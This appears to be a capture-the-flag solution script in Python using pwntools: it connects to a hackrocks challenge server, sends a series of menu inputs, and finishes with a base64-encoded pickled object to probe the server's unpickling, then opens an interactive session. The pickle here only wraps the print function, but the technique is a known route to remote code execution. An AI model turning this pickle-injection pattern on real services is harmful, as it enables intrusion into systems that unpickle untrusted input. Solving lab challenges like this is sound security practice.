from pwn import *
import time

import pickle
import base64

txt = print
s = pickle.dumps(txt)
s = base64.b64encode(s).decode('utf-8')

# Set up pwntools context
context.log_level = 'info'

# Connect to the remote server
io = remote('challenges.hackrocks.com', 47801)

# List of inputs to send
inputs = [
    "0", "1", "0", "2", "0", "3", "0", "4", "0", "5",
    "0", "6", "0", "7", "0", "8", "0", "9",
    "1", "0", "1", "1", "1", "2", "1", "3", "1", "4", s
]

# Send each input with a 1-second delay
for item in inputs:
    io.sendline(item)
    # time.sleep(1)

# Interact with the server if needed
io.interactive()
